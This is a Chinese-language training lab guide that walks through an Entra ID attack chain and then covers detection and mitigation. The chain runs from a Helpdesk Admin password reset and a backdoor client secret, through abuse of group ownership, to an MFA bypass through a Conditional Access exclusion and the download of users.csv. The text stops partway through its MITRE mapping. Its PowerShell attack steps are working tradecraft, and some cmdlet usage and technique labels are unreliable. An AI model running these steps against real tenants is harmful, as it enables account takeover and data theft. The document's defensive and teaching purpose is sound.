# Learning Objective 4：角色滥用、组所有权操纵与 MFA 绕过

> 基于第 37 页至第 45 页 PDF 文档，结合 [AzureAD-Attack-Defense-frame](https://github.com/Cloud-Architekt/AzureAD-Attack-Defense) 项目的实践资料编写

## 目录

- [核心目标](#核心目标)
- [理论基础](#理论基础)
- [实验前置条件](#实验前置条件)
- [详细实验步骤](#详细实验步骤)
- [检测方法](#检测方法)
- [缓解措施](#缓解措施)
- [MITRE ATT&CK 映射](#mitre-attck-映射)
- [参考资料](#参考资料)

---

## 核心目标

本学习目标展示了一套完整的**特权滥用链**，从滥用 Entra ID（原 Azure AD）的角色权限开始，修改对象属性，利用所有权修改组策略，最后通过分析条件访问策略（Conditional Access Policy, CAP）的逻辑漏洞来绕过 MFA（多因素认证）。

### 攻击链概览

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         特权滥用攻击链                                    │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐              │
│  │  角色滥用    │ -> │ 所有权操纵  │ -> │  MFA 绕过    │              │
│  │              │    │              │    │              │              │
│  │ Helpdesk     │    │ ExpStorage   │    │ 条件访问    │              │
│  │ Admin        │    │ AppSP Owner  │    │ 策略漏洞    │              │
│  │ App Admin    │    │              │    │              │              │
│  └──────────────┘    └──────────────┘    └──────────────┘              │
│        │                    │                    │                     │
│        v                    v                    v                     │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐              │
│  │ 重置密码    │    │ 添加用户到  │    │ 下载数据    │              │
│  │ 添加后门    │    │ 特权组      │    │ users.csv   │              │
│  └──────────────┘    └──────────────┘    └──────────────┘              │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### 具体攻击目标

| 阶段 | 目标 | 涉及角色/对象 |
|------|------|---------------|
| **阶段 1** | 重置用户 `StorageMapperX` 的密码 | `GeologyApp` (Helpdesk Administrator) |
| **阶段 2** | 给服务主体 `ExpStorageAppSP` 添加后门（Client Secret） | `GeologyApp` (Application Administrator) |
| **阶段 3** | 将 `StorageMapperX` 用户添加到 `StorageAccess` 组 | `ExpStorageAppSP` (组所有者) |
| **阶段 4** | 分析条件访问策略，发现 MFA 例外 | `GeologyApp` (Policy.Read.All) |
| **阶段 5** | 利用 CAP 例外绕过 MFA 下载 `users.csv` | `StorageMapperX` (StorageAccess 组成员) |

---

## 理论基础

### 1. 管理单元 (Administrative Units) 与角色范围

#### 概念说明

Microsoft Entra ID 中的管理单元（Administrative Units, AU）允许将权限限制在特定范围内，而不是授予整个租户的权限。

**官方文档参考：** [Administrative units in Microsoft Entra ID](https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/administrative-units)

#### 为什么需要管理单元？

在大型组织中，全局管理员权限过于宽泛。管理单元允许：

1. **权限隔离**：将管理权限限制在特定部门或区域
2. **责任分离**：不同部门管理各自的用户
3. **最小权限原则**：遵循零信任安全模型

#### 在本实验中的应用

```
┌─────────────────────────────────────────────────────────────┐
│                    SyncUnit 管理单元                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  用户列表:                                                   │
│  - StorageMapperX (非管理员) ✓ 可管理                       │
│  - OtherUser1       (非管理员) ✓ 可管理                     │
│  - AdminUser        (管理员)    ✗ 不可管理                  │
│                                                             │
│  GeologyApp 角色: Helpdesk Administrator (限 AU 范围)       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**关键点：** Helpdesk Administrator 可以重置管理单元内非管理员用户的密码，但不能重置其他管理单元内的用户或管理员用户的密码。

---

### 2. Application Administrator 角色权限滥用

#### 概念说明

Application Administrator 角色拥有在 Entra ID 中创建和管理所有应用程序注册的权限。

**权限包括：**
- 创建/删除应用程序注册
- 添加/删除应用程序密钥（Client Secrets）
- 添加/删除应用程序证书
- 修改应用程序权限
- 管理服务主体凭据

#### 攻击向量

```powershell
# Application Administrator 可以执行的操作
Add-MgApplicationPassword          # 添加密码凭据
Add-MgApplicationKeyCredential      # 添加证书凭据
Update-MgServicePrincipal           # 修改服务主体属性
```

**类比理解：** 你是一名锁匠（App Admin），虽然你原本没有某个房间（App）的钥匙，但你有权给这个房间的门锁配一把新钥匙（Add Secret），然后自己开门进去。

**相关资料：** [ServicePrincipals-ADO.md](ServicePrincipals-ADO.md) 中详细介绍了服务主体的安全问题和最佳实践。

---

### 3. 对象所有权 (Ownership) 与组管理

#### 概念说明

在 Microsoft Entra ID 中，如果一个用户或服务主体是某个组的 **Owner（所有者）**，那么无论它是否有用户管理员角色，它都可以管理这个组的成员资格。

**所有者权限：**
- 添加/删除组成员
- 修改组属性
- 管理组所有者
- 删除组（如果是唯一所有者）

**官方文档参考：** [Manage owners for a group](https://learn.microsoft.com/en-us/entra/fundamentals/users-groups-manage-owners)

#### 攻击场景

```
攻击前:
┌─────────────────────────────────────────────────────────────┐
│  StorageAccess 组                                           │
│  ├─ 所有者: ExpStorageAppSP                                │
│  └─ 成员:                                                  │
│      - User1                                               │
│      - User2                                               │
│                                                             │
│  StorageMapperX: 不在组中 ❌                                │
└─────────────────────────────────────────────────────────────┘

攻击后 (ExpStorageAppSP 执行操作):
┌─────────────────────────────────────────────────────────────┐
│  StorageAccess 组                                           │
│  ├─ 所有者: ExpStorageAppSP                                │
│  └─ 成员:                                                  │
│      - User1                                               │
│      - User2                                               │
│      - StorageMapperX ✓ 新添加                              │
│                                                             │
│  StorageMapperX: 现在是组成员 ✓                             │
└─────────────────────────────────────────────────────────────┘
```

**关键发现：** 这个权限绕过了传统的角色层次结构，使得没有管理员角色的服务主体也能进行权限提升。

---

### 4. 条件访问策略 (Conditional Access Policy) 的逻辑漏洞

#### 概念说明

条件访问策略（CAP）是 Microsoft Entra ID 的零信任核心组件，它基于信号（signals）做出访问决策。

**策略评估逻辑：**

```
┌─────────────────────────────────────────────────────────────┐
│                    条件访问策略评估                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. 用户/组    ──┐                                          │
│  2. 位置       ──┼──> [策略引擎] ──> [访问决策]             │
│  3. 设备       ──┤     ✓ 允许                              │
│  4. 应用       ──┘     ✗ 拒绝                              │
│                      ○ 要求 MFA                            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**官方文档参考：** [Conditional Access: Target resources](https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-conditional-access-cloud-apps)

#### 常见的配置漏洞

**漏洞 1：排除项（Exclusions）过于宽泛**

```json
{
  "includeGroups": ["StorageAccess"],
  "grantControls": ["MFA"],
  "excludeApplications": [
    "e406a681-f3d4-4a82-a96d-b6e22c7e2e26"  // Azure Storage
  ]
}
```

**漏洞 2：信任位置（Trusted Locations）**

```json
{
  "includeLocations": ["All"],
  "excludeLocations": ["TrustedLocation-CorporateHQ"]
}
```

**漏洞 3：平台排除**

```json
{
  "includePlatforms": ["iOS", "Android", "Windows", "macOS"],
  "excludePlatforms": ["Linux"]  // 被忽略的平台
}
```

#### 在本实验中的利用

**策略配置（StorageAccessPolicy）：**

| 配置项 | 值 |
|--------|-----|
| IncludeGroups | StorageAccess |
| GrantControls | 要求 MFA |
| ExcludeApplications | Azure Storage (`e406a681-f3d4-4a82-a96d-b6e22c7e2e26`) |

**利用方式：**
1. 攻击者将 `StorageMapperX` 添加到 `StorageAccess` 组
2. 攻击者尝试访问 Azure Storage API
3. CAP 策略评估：用户在 `StorageAccess` 组，但应用在排除列表中
4. **结果：** MFA 要求被绕过，直接允许访问

**相关资料：** [LateralMovementADEID.md](LateralMovementADEID.md) 详细介绍了在 AD 被攻陷后如何保护 Entra ID，包括条件访问策略的配置。

---

## 实验前置条件

### 环境要求

| 组件 | 要求 | 说明 |
|------|------|------|
| **Microsoft Entra ID 租户** | 需要有效的租户 | 实验或生产环境 |
| **权限** | Global Administrator 或等效权限 | 用于设置实验环境 |
| **PowerShell 模块** | Microsoft.Graph, Az | 用于执行操作 |
| **应用程序** | GeologyApp | 具有 Helpdesk Admin 和 Application Admin 角色 |
| **用户** | StorageMapperX | 目标用户账户 |
| **服务主体** | ExpStorageAppSP | 具有 StorageAccess 组所有者身份 |
| **Azure 存储账户** | oiltapusers | 包含目标文件 users.csv |

### 为什么需要这些条件？

1. **管理单元配置**：确保 GeologyApp 的 Helpdesk Admin 角色被限制在特定范围内
2. **应用程序权限**：Application Admin 角色是添加凭据的前提条件
3. **组所有权**：服务主体必须是目标组的 Owner 才能修改成员
4. **策略配置**：条件访问策略必须存在且包含排除项

### 实验环境架构

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         实验环境架构                                      │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │                     Microsoft Entra ID                           │   │
│  ├─────────────────────────────────────────────────────────────────┤   │
│  │                                                                 │   │
│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐          │   │
│  │  │ GeologyApp   │  │ExpStorageApp │  │ StorageAccess│          │   │
│  │  │ (服务主体)   │  │    SP        │  │    (组)      │          │   │
│  │  │              │  │              │  │              │          │   │
│  │  │ 角色:        │  │ 角色:        │  │ 所有者:      │          │   │
│  │  │ - Helpdesk   │  │ - Group      │  │ ExpStorageApp│          │   │
│  │  │   Admin      │  │   Owner      │  │    SP        │          │   │
│  │  │ - App Admin  │  │              │  │              │          │   │
│  │  └──────────────┘  └──────────────┘  └──────────────┘          │   │
│  │                                                                 │   │
│  │  ┌──────────────────────────────────────────────────────────┐  │   │
│  │  │              SyncUnit 管理单元                           │  │   │
│  │  │  ┌────────────────┐                                      │  │   │
│  │  │  │ StorageMapperX │                                      │  │   │
│  │  │  └────────────────┘                                      │  │   │
│  │  └──────────────────────────────────────────────────────────┘  │   │
│  │                                                                 │   │
│  │  ┌──────────────────────────────────────────────────────────┐  │   │
│  │  │        条件访问策略: StorageAccessPolicy                 │  │   │
│  │  │  - Include: StorageAccess 组                            │  │   │
│  │  │  - Grant: MFA                                           │  │   │
│  │  │  - Exclude: Azure Storage                               │  │   │
│  │  └──────────────────────────────────────────────────────────┘  │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                         │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │                     Azure Storage                               │   │
│  ├─────────────────────────────────────────────────────────────────┤   │
│  │  oiltapusers/storage/                                         │   │
│  │  └── tapusers/                                                │   │
│  │      └── users.csv  ← 目标文件                                 │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 详细实验步骤

### 步骤 1：滥用 Helpdesk 角色重置用户密码

#### 目标
使用 `GeologyApp` 的 Helpdesk Administrator 权限重置 `StorageMapperX` 用户的密码。

#### 原理说明
Helpdesk Administrator 在管理单元范围内可以重置非管理员用户的密码。这是为了允许部门级别的 IT 支持人员管理各自部门的用户账户。

#### 执行步骤

**1.1 连接到 Microsoft Graph**

```powershell
# 安装所需模块
Install-Module Microsoft.Graph -Force

# 连接到 Graph (使用服务主体凭据)
Connect-MgGraph -ClientId "<GeologyApp-ClientId>" `
               -TenantId "<TenantId>" `
               -CertificateThumbprint "<CertificateThumbprint>"
```

**1.2 验证角色权限**

```powershell
# 检查 GeologyApp 的角色分配
Get-MgServicePrincipalAppRoleAssignment `
    -ServicePrincipalId "<GeologyApp-Id>" | `
    Select-Object AppRoleId, PrincipalDisplayName
```

**1.3 重置目标用户密码**

```powershell
# 定义新密码配置
$passwordProfile = @{
    forceChangePasswordNextSignIn = $false
    password = 'NewUserSSecret@PassX'
}

# 重置密码
Update-MgUser -UserId "StorageMapperX@<domain>.com" `
              -PasswordProfile $passwordProfile `
              -Confirm

# 验证密码已更改
Get-MgUser -UserId "StorageMapperX@<domain>.com" |
    Select-Object DisplayName, UserPrincipalName
```

#### 预期结果
```
✓ 密码重置成功
✓ StorageMapperX 现在可以使用新密码登录
✓ 审计日志中记录密码重置操作
```

#### 相关审计日志
```kql
AuditLogs
| where Category == "UserManagement"
| where OperationName == "Update user"
| where TargetResources[0].userPrincipalName contains "StorageMapperX"
| project Timestamp, OperationName, Actor, TargetResources
```

---

### 步骤 2：滥用 App Admin 角色添加应用机密

#### 目标
使用 `GeologyApp` 的 Application Administrator 权限给 `ExpStorageAppSP` 服务主体添加一个新的 Client Secret。

#### 原理说明
Application Administrator 可以管理所有应用程序的凭据。通过添加新的密码凭据，攻击者可以获得服务主体的长期访问权限。

#### 执行步骤

**2.1 识别目标服务主体**

```powershell
# 查找 ExpStorageAppSP
$sp = Get-MgServicePrincipal -Filter "displayName eq 'ExpStorageAppSP'"

# 显示详细信息
$sp | Select-Object Id, DisplayName, AppId
```

**2.2 添加新的密码凭据**

```powershell
# 密码参数
$params = @{
    passwordCredential = @{
        displayName = "BackdoorSecret_$(Get-Date -Format 'yyyyMMdd')"
        endDateTime = (Get-Date).AddMonths(6)  # 6个月有效期
    }
}

# 添加密码
$password = Add-MgApplicationPassword -ApplicationId $sp.AppId `
                                      -BodyParameter $params

# 保存密码信息 (重要：只会显示一次!)
$secretText = $password.secretText
Write-Host "Secret保存成功: $secretText" -ForegroundColor Green
```

**2.3 验证凭据已添加**

```powershell
# 列出所有活动凭据
Get-MgServicePrincipal -ServicePrincipalId $sp.Id |
    Select-Object -ExpandProperty PasswordCredentials |
    Where-Object endDateTime -gt (Get-Date) |
    Select-Object DisplayName, EndDateTime
```

#### 预期结果
```
✓ 新的 Client Secret 已创建
✓ Secret 文本已安全保存
✓ 有效期设置为 6 个月
✓ 审计日志记录凭据添加操作
```

#### 安全提示
> ⚠️ **重要**：Client Secret 只在创建时显示一次。如果丢失，需要重新创建。

#### 相关审计日志
```kql
AuditLogs
| where Category == "ApplicationManagement"
| where OperationName == "Add password to application"
| where TargetResources[0].displayName == "ExpStorageAppSP"
| project Timestamp, OperationName, Actor, TargetResources
```

---

### 步骤 3：滥用所有权修改组内成员（横向移动）

#### 目标
使用步骤 2 中获取的凭据登录为 `ExpStorageAppSP`，然后利用其作为 `StorageAccess` 组所有者的身份，将 `StorageMapperX` 添加到该组。

#### 原理说明
服务主体如果是组的所有者，即使没有管理员角色，也可以管理组的成员资格。这是一种常见的权限提升向量。

#### 执行步骤

**3.1 使用服务主体登录**

```powershell
# 使用新创建的 Client Secret 登录
$secureSecret = ConvertTo-SecureString $secretText -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential `
    ($sp.AppId, $secureSecret)

Connect-MgGraph -ClientSecretCredential $credential -TenantId "<TenantId>"
```

**3.2 查看服务主体拥有的对象**

```powershell
# 获取服务主体拥有的所有对象
$ownedObjects = Get-MgServicePrincipalOwnedObject `
    -ServicePrincipalId $sp.Id

# 查找 StorageAccess 组
$storageAccessGroup = $ownedObjects |
    Where-Object { $_.AdditionalProperties['displayName'] -eq 'StorageAccess' }

Write-Host "拥有对象 ID: $($storageAccessGroup.Id)" -ForegroundColor Cyan
```

**3.3 获取目标用户 ID**

```powershell
# 获取 StorageMapperX 的 ID
$targetUser = Get-MgUser -Filter "userPrincipalName eq 'StorageMapperX@<domain>.com'"
Write-Host "目标用户 ID: $($targetUser.Id)" -ForegroundColor Cyan
```

**3.4 添加用户到组**

```powershell
# 创建目录对象引用
$directoryObject = @{
    "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$($targetUser.Id)"
}

# 添加成员
New-MgGroupMember -GroupId $storageAccessGroup.Id `
                  -BodyParameter $directoryObject

# 验证添加成功
Get-MgGroupMember -GroupId $storageAccessGroup.Id |
    Select-Object Id, DisplayName |
    Where-Object { $_.DisplayName -eq 'StorageMapperX' }
```

#### 预期结果
```
✓ StorageMapperX 已添加到 StorageAccess 组
✓ 用户现在继承组的所有权限
✓ 审计日志记录组成员添加操作
```

#### 相关审计日志
```kql
AuditLogs
| where Category == "GroupManagement"
| where OperationName == "Add member to group"
| where TargetResources[0].displayName == "StorageAccess"
| project Timestamp, OperationName, Actor, TargetResources, ModifiedProperties
```

---

### 步骤 4：遭遇 MFA 拦截并分析策略

#### 目标
尝试使用 `StorageMapperX` 访问资源，遭遇 MFA 拦截，然后分析条件访问策略以寻找绕过方法。

#### 原理说明
条件访问策略基于多种信号做出访问决策。通过枚举和分析策略配置，攻击者可以发现潜在的绕过路径。

#### 执行步骤

**4.1 尝试访问资源（预期失败）**

```powershell
# 使用 StorageMapperX 登录
$storageMapperCred = Get-Credential -UserName "StorageMapperX@<domain>.com"
Connect-AzAccount -Credential $storageMapperCred

# 尝试列出 Key Vault (应该失败)
Get-AzKeyVault -VaultName "example-vault"
```

**预期错误：**
```
ERROR: You must use multi-factor authentication to access this resource.
```

**4.2 枚举条件访问策略**

```powershell
# 需要 Policy.Read.All 权限
# 使用 GeologyApp (假设有此权限)
Connect-MgGraph -ClientId "<GeologyApp-ClientId>" `
               -TenantId "<TenantId>" `
               -CertificateThumbprint "<CertificateThumbprint>"

# 获取所有条件访问策略
$policies = Get-MgIdentityConditionalAccessPolicy

# 筛选与 StorageAccess 相关的策略
$targetPolicy = $policies |
    Where-Object { $_.Conditions.Users.IncludeGroups -contains "<StorageAccess-GroupId>" }

# 显示策略详情
$targetPolicy | Format-List DisplayName, State, Conditions, GrantControls
```

**4.3 分析策略配置**

```powershell
# 详细分析目标策略
$policyDetails = @{
    PolicyName = $targetPolicy.DisplayName
    State = $targetPolicy.State
    IncludeGroups = $targetPolicy.Conditions.Users.IncludeGroups
    GrantControls = $targetPolicy.GrantControls.BuiltInControls
    ExcludeApplications = $targetPolicy.Conditions.Applications.ExcludeApplications
}

# 转换为 JSON 并显示
$policyDetails | ConvertTo-Json -Depth 5
```

**预期发现：**
```json
{
  "PolicyName": "StorageAccessPolicy",
  "State": "enabled",
  "IncludeGroups": ["<StorageAccess-GroupId>"],
  "GrantControls": ["mfa"],
  "ExcludeApplications": [
    "e406a681-f3d4-4a82-a96d-b6e22c7e2e26"
  ]
}
```

**4.4 识别排除的应用**

```powershell
# 查找排除应用的名称
$excludedAppIds = $targetPolicy.Conditions.Applications.ExcludeApplications

foreach ($appId in $excludedAppIds) {
    $app = Get-MgServicePrincipal -Filter "appId eq '$appId'"
    Write-Host "排除的应用: $($app.DisplayName) (AppId: $appId)" -ForegroundColor Yellow
}
```

#### 预期结果
```
✓ 发现 StorageAccess 组需要 MFA
✓ 发现 Azure Storage 应用在排除列表中
✓ 识别到潜在的绕过路径
```

#### 相关审计日志
```kql
AADSignInEvents
| where AccountUpn == "StorageMapperX@<domain>.com"
| where ConditionalAccessPolicies contains "StorageAccessPolicy"
| project Timestamp, Result, ConditionalAccessPolicies,
          ConditionalAccessStatus
```

---

### 步骤 5：利用例外绕过 MFA 并窃取数据

#### 目标
利用条件访问策略中的排除项，使用 `StorageMapperX` 绕过 MFA 要求，直接访问 Azure Storage 下载数据。

#### 原理说明
条件访问策略的排除项通常会创建安全漏洞。攻击者可以针对被排除的应用直接发起请求，从而绕过策略检查。

#### 执行步骤

**5.1 获取存储账户访问令牌**

```powershell
# 登录为 StorageMapperX
Connect-AzAccount -Credential $storageMapperCred

# 获取存储账户上下文（不需要 MFA，因为 Storage 在排除列表中）
$storageAccountName = "oiltapusers"
$containerName = "tapusers"

# 创建存储上下文
$storageContext = New-AzStorageContext -StorageAccountName $storageAccountName
```

**5.2 列出容器内容**

```powershell
# 列出 Blob
$blobs = Get-AzStorageBlob -Container $containerName -Context $storageContext

# 显示所有 Blob
$blobs | Select-Object Name, Length, LastModified | Format-Table -AutoSize
```

**预期输出：**
```
Name          Length           LastModified
----          ------           -------------
users.csv     2048             2024-01-15 10:30:45
```

**5.3 下载目标文件**

```powershell
# 定义本地保存路径
$localPath = "C:\Temp\users.csv"

# 下载 Blob
Get-AzStorageBlobContent -CloudBlob $blobs[0].CloudBlob `
                        -Context $storageContext `
                        -Destination $localPath `
                        -Force

Write-Host "文件已下载到: $localPath" -ForegroundColor Green
```

**5.4 验证下载内容**

```powershell
# 显示文件内容（前几行）
Get-Content $localPath -First 5
```

#### 预期结果
```
✓ 成功绕过 MFA 要求
✓ users.csv 文件已下载
✓ 文件包含后续攻击所需的凭据 (explorationsyncuserX)
```

#### 攻击链总结

```
步骤 1: Helpdesk Admin ──> 重置 StorageMapperX 密码
                                    │
步骤 2: App Admin ──────────────────┼────> 添加 ExpStorageAppSP 后门
                                    │
步骤 3: ExpStorageAppSP Owner ──────┼────> 添加 StorageMapperX 到 StorageAccess 组
                                    │
步骤 4: 策略分析 ───────────────────┼────> 发现 Azure Storage 排除
                                    │
步骤 5: 绕过 MFA ───────────────────┴────> 下载 users.csv
                                                │
                                        获取后续凭据
                                            explorationsyncuserX
```

---

## 检测方法

基于 [AzureAD-Attack-Defense-frame](README.md) 项目，以下是针对此攻击链的检测方法。

### 1. 审计日志监控

#### 1.1 密码重置检测

**文件位置：** [queries/AADConnectorAccount-AddedTAPorChangedPassword.kql](queries/AADConnectorAccount-AddedTAPorChangedPassword.kql)

```kql
// 检测可疑的密码重置活动
AuditLogs
| where Category == "UserManagement"
| where OperationName == "Change user password" or
      OperationName == "Reset user password"
| where InitiatedBy == "GeologyApp"
| where TargetResources contains "StorageMapperX"
| extend Actor = tostring(InitiatedBy.user.userPrincipalName),
         Target = tostring(TargetResources[0].userPrincipalName)
| project Timestamp, OperationName, Actor, Target,
          AdditionalDetails, TenantId
```

#### 1.2 应用凭据添加检测

```kql
// 检测服务主体的凭据添加
AuditLogs
| where Category == "ApplicationManagement"
| where OperationName == "Add service principal password" or
      OperationName == "Add password to application"
| where TargetResources[0].displayName == "ExpStorageAppSP"
| project Timestamp, OperationName,
          Actor = InitiatedBy.user.userPrincipalName,
          Target = TargetResources[0].displayName,
          ModifiedProperties
```

#### 1.3 组成员添加检测

```kql
// 检测组成员的可疑添加
AuditLogs
| where Category == "GroupManagement"
| where OperationName == "Add member to group"
| where TargetResources[0].displayName == "StorageAccess"
| extend AddedMember = tostring(TargetResources[0].modifiedProperties[0].newValue)
| project Timestamp, OperationName,
          Actor = InitiatedBy.user.userPrincipalName,
          GroupName = TargetResources[0].displayName,
          AddedMember
| where Actor contains "ExpStorageAppSP"
```

### 2. 条件访问策略变更监控

**文件位置：** [config/ruletemplates/Policy-change-detected.json](config/ruletemplates/Policy-change-detected.json)

```kql
// 监控条件访问策略的变更
AuditLogs
| where Category == "Policy"
| where OperationName contains "Conditional Access Policy"
| project Timestamp, OperationName,
          Actor = InitiatedBy.user.userPrincipalName,
          TargetPolicy = TargetResources[0].displayName,
          ModifiedProperties = TargetResources[0].modifiedProperties
| where ModifiedProperties has "Exclude" or
      ModifiedProperties has "Include"
```

### 3. 多阶段攻击关联检测

**文件位置：** [queries/MDA-Hunt-Multi-Stage-Incident.kql](queries/MDA-Hunt-Multi-Stage-Incident.kql)

```kql
// 关联多阶段攻击活动
let timeRange = 1h;
let targetUser = "StorageMapperX@<domain>.com";
let targetServicePrincipal = "ExpStorageAppSP";

// 步骤 1: 密码重置
let passwordReset = AuditLogs
| where Category == "UserManagement"
| where OperationName == "Reset user password"
| where TargetResources[0].userPrincipalName == targetUser
| project Timestamp, Stage = "Password Reset", Actor;

// 步骤 2: 凭据添加
let credentialAdd = AuditLogs
| where Category == "ApplicationManagement"
| where OperationName contains "password"
| where TargetResources[0].displayName == targetServicePrincipal
| project Timestamp, Stage = "Credential Added", Actor;

// 步骤 3: 组成员添加
let groupMemberAdd = AuditLogs
| where Category == "GroupManagement"
| where OperationName == "Add member to group"
| where TargetResources[1].userPrincipalName == targetUser
| project Timestamp, Stage = "Group Membership Added", Actor;

// 关联所有阶段
union passwordReset, credentialAdd, groupMemberAdd
| sort by Timestamp asc
| summarize count(), Stages = make_list(Stage) by Actor
| where count_ >= 2
```

### 4. Microsoft Defender for Cloud Apps 检测

**文件位置：** [PasswordSpray.md](PasswordSpray.md) 中详细介绍了 MDA 的检测能力

**内置规则：**
- OAuth 应用凭据的异常添加
- 可疑的 OAuth 应用名称
- 恶意 OAuth 应用同意授予
- OAuth 应用的可疑文件下载活动

### 5. Microsoft Sentinel 检测规则

**相关检测规则模板：**
- [Password spray attack against Entra ID application](https://github.com/Azure/Azure-Sentinel/blob/master/Detections/SigninLogs/SigninPasswordSpray.yaml)
- [Potential Password Spray Attack (ASIM)](https://github.com/Azure/Azure-Sentinel/blob/master/Detections/ASimAuthentication/imAuthPasswordSpray.yaml)

---

## 缓解措施

### 1. 条件访问策略加固

#### 1.1 移除不必要的排除项

**当前配置（有漏洞）：**
```json
{
  "includeGroups": ["StorageAccess"],
  "grantControls": ["mfa"],
  "excludeApplications": ["e406a681-f3d4-4a82-a96d-b6e22c7e2e26"]
}
```

**推荐配置（安全）：**
```json
{
  "includeGroups": ["StorageAccess"],
  "grantControls": ["mfa"],
  "excludeApplications": []
}
```

#### 1.2 实施多重控制

**官方文档参考：** [Conditional Access: Grant controls](https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-conditional-access-grant)

```json
{
  "includeGroups": ["StorageAccess"],
  "grantControls": {
    "operator": "AND",
    "builtInControls": [
      "mfa",
      "compliantDevice",
      "hybridEntraDomainJoinedDevice"
    ]
  }
}
```

### 2. 角色分配最佳实践

**文件位置：** [LateralMovementADEID.md](LateralMovementADEID.md)

#### 2.1 限制服务主体的管理员角色

```powershell
# 检查当前具有管理员角色的服务主体
$privilegedSPs = Get-MgRoleManagementDirectoryRoleAssignment |
    Where-PrincipalType -eq "ServicePrincipal"

foreach ($sp in $privilegedSPs) {
    $principal = Get-MgServicePrincipal -ServicePrincipalId $sp.PrincipalId
    $role = Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleId $sp.RoleDefinitionId
    Write-Host "SP: $($principal.DisplayName), Role: $($role.DisplayName)"
}
```

#### 2.2 实施最小权限原则

**推荐做法：**
- 使用托管标识（Managed Identities）代替服务主体
- 为特定应用程序创建特定的自定义角色
- 定期审查和清理不再需要的权限

### 3. 组所有权管理

#### 3.1 定期审查组所有者

```powershell
# 查找所有具有管理员权限的组
$privilegedGroups = Get-MgGroup -All |
    Where-Object { $_.DisplayName -match "Admin|Privileged|Access" }

foreach ($group in $privilegedGroups) {
    $owners = Get-MgGroupOwner -GroupId $group.Id
    Write-Host "Group: $($group.DisplayName)"
    foreach ($owner in $owners) {
        Write-Host "  Owner: $($owner.AdditionalProperties.userPrincipalName)"
    }
}
```

#### 3.2 实施组生命周期管理

**推荐做法：**
- 使用 Privileged Identity Management (PIM) 管理组所有权
- 定期审查组成员资格和所有者
- 实施访问审查（Access Reviews）

### 4. 工作负载身份保护

**文件位置：** [ServicePrincipals-ADO.md](ServicePrincipals-ADO.md)

#### 4.1 使用证书而非密码

```powershell
# 创建自签名证书
$cert = New-SelfSignedCertificate -Subject "CN=MyApp" `
                                   -CertStoreLocation "Cert:\CurrentUser\My" `
                                   -KeyExportPolicy Exportable `
                                   -Type CodeSigningCert

# 添加证书到应用
$certBytes = [System.IO.File]::ReadAllBytes("cert.cer")
$keyCredential = @{
    type = "AsymmetricX509Cert"
    usage = "Verify"
    key = [System.Convert]::ToBase64String($certBytes)
}

Update-MgServicePrincipal -ServicePrincipalId "<SP-ID>" `
    -KeyCredentials @($keyCredential)
```

#### 4.2 实施凭据轮换

```powershell
# 轮换服务主体密钥
function Rotate-ServicePrincipalSecret {
    param(
        [string]$ServicePrincipalId,
        [int]$ValidityDays = 90
    )

    # 创建新密钥
    $params = @{
        passwordCredential = @{
            displayName = "RotatedSecret_$(Get-Date -Format 'yyyyMMdd')"
            endDateTime = (Get-Date).AddDays($ValidityDays)
        }
    }

    # 添加新密钥
    $newSecret = Add-MgApplicationPassword -ServicePrincipalId $ServicePrincipalId `
                                           -BodyParameter $params

    # TODO: 保存新密钥到安全存储
    return $newSecret.secretText
}
```

### 5. 监控和告警

#### 5.1 配置实时告警

**推荐配置：**
- 所有管理员角色的活动
- 组成员资格变更
- 应用程序凭据操作
- 条件访问策略变更

#### 5.2 使用 Microsoft Defender for Cloud Apps

**文件位置：** [ConsentGrant.md](ConsentGrant.md)

**内置策略：**
- 检测可疑的 OAuth 应用
- 监控应用权限变更
- 识别异常的数据访问模式

### 6. 事件响应准备

**文件位置：** [LateralMovementADEID.md](LateralMovementADEID.md)

**快速响应检查清单：**

| 阶段 | 行动 | 优先级 |
|------|------|--------|
| **检测** | 监控审计日志 | 高 |
| **遏制** | 禁用受影响的账户 | 高 |
| **清除** | 撤销所有会话 | 高 |
| **恢复** | 重置所有凭据 | 中 |
| **事后** | 审查和加固 | 中 |

---

## MITRE ATT&CK 映射

本学习目标中的攻击技术映射到以下 MITRE ATT&CK 框架技术：

### 战术和技术映射

| 战术 | 技术 | 描述 |
|------|------|------|
| **Privilege Escalation** | T1078.004 | Valid Accounts: Cloud Accounts |
| **Credential Access** | T1552.001 | Unsecured Credentials: Credentials In Files |
| **Defense Evasion** | T1550.001 | Application Level Authentication Schemes |
| **Initial Access** | T1078.004 | Valid Accounts: Cloud Accounts |
| **Persistence** | T1098.001 | Account Manipulation: Additional Cloud Credentials |

### 详细映射

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    MITRE ATT&CK 映射                                    │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  TA0004 - Privilege Escalation                                         │
│  │                                                                     │
│  │  └── T1078.004 - Valid Accounts: Cloud Accounts                    │
│  │      • 步骤 2: 添加服务主体凭据                                    │
│  │      • 步骤 3: 使用服务主体添加组成员                              │
│  │                                                                     │
│  TA0006 - Credential Access                                            │
│  │                                                                     │
│  │  ├── T1552.001 - Unsecured Credentials: Credentials In Files       │
│  │  │   • 步骤 5: 从 users.csv 读取凭据                               │
│  │  │                                                                │
│  │  └── T1110.003 - Brute Force: Password Spraying                   │
│  │      • (相关的攻击向量，但不在本学习目标中)                        │
│  │                                                                     │
│  TA0005 - Defense Evasion                                              │
│  │                                                                     │
